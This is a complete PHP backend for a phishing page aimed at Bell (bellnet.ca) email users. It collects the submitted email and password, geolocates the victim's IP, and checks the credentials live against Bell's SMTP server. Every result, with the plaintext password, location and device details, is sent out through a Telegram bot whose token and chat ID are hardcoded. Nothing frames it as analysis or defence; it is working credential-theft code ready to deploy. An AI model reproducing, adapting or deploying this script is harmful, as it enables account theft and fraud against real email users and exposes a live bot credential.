<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

error_reporting(E_ALL);
ini_set('display_errors', 1);
ob_clean();
header('Content-Type: application/json; charset=utf-8');

function sendToTelegram($message) {
    $botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';
    $chatId   = '7394958970';
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($url . '?' . http_build_query($params));
}

function safe($str) {
    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
}

$response = [ "status" => "error", "message" => "Unknown error" ]; // ✅ always initialized

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email        = trim($_POST['email'] ?? '');
    $password     = $_POST['input_text'] ?? '';
    $browser_info = safe($_POST['browser_info'] ?? '');
    $device_info  = safe($_POST['device_info'] ?? '');

    // ✅ Extra Info
    $userAgent = safe($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
    $referer   = safe($_SERVER['HTTP_REFERER'] ?? 'Direct');
    $language  = safe($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown');

    // Email validation
    if (!preg_match('/^[^@\s]+@bellnet\.ca$/', $email)) {
        $response = ['status' => 'error', 'message' => 'Email must end with @bellnet.ca.'];
        echo json_encode($response); exit;
    }

    if (!$password) {
        $response = ['status' => 'error', 'message' => 'Password is required.'];
        echo json_encode($response); exit;
    }

    // Get IP & location
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'];
    $locationData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
    $locationText = '';
    if ($locationData) {
        $loc = json_decode($locationData, true);
        if (is_array($loc)) {
            $locationText = "{$loc['city']}, {$loc['regionName']}, {$loc['country']} (IP: {$loc['query']})";
        }
    }

    // SMTP check
    $server = 'ssl://smtpa.bellnet.ca';
    $port   = 465;
    $contextOptions = ['ssl' => ['verify_peer'=>false,'verify_peer_name'=>false,'allow_self_signed'=>true]];
    $context = stream_context_create($contextOptions);
    $fp = @stream_socket_client("$server:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);

    if (!$fp) {
        $response = [
            'status' => 'error',
            'message' => "Connection failed: $errstr ($errno)"
        ];
        sendToTelegram("❌ Connection Failed
📧 Email: $email
🔑 Password: $password

🌍 Location: $locationText
🖥️ Browser: $browser_info
📱 Device: $device_info

🔎 User Agent: $userAgent
↪️ Referer: $referer
🌐 Language: $language

Error: $errstr ($errno)");
    } else {
        fgets($fp);
        fputs($fp, "EHLO localhost\r\n");
        while ($line = fgets($fp)) {
            if (strpos($line, '250 ') === 0) break;
        }
        fputs($fp, "AUTH LOGIN\r\n");
        fgets($fp);
        fputs($fp, base64_encode($email) . "\r\n");
        fgets($fp);
        fputs($fp, base64_encode($password) . "\r\n");
        $smtpResponse = fgets($fp);

        if (strpos($smtpResponse, '235') === 0) {
            $response = [
                'status' => 'success',
                'message' => 'Login Successful'
            ];
            sendToTelegram("✅ Login Successful
📧 Email: $email
🔑 Password: $password

🌍 Location: $locationText
🖥️ Browser: $browser_info
📱 Device: $device_info

🔎 User Agent: $userAgent
↪️ Referer: $referer
🌐 Language: $language");
        } else {
            $response = [
                'status' => 'error',
                'message' => 'You have entered invalid credentials. Please try again.'
            ];
            sendToTelegram("❌ Login Failed
📧 Email: $email
🔑 Password: $password

🌍 Location: $locationText
🖥️ Browser: $browser_info
📱 Device: $device_info

🔎 User Agent: $userAgent
↪️ Referer: $referer
🌐 Language: $language

Response: " . safe($smtpResponse));
        }

        fputs($fp, "QUIT\r\n");
        fclose($fp);
    }
} else {
    $response = ['status' => 'error', 'message' => 'Invalid request method.'];
}

echo json_encode($response);
?>

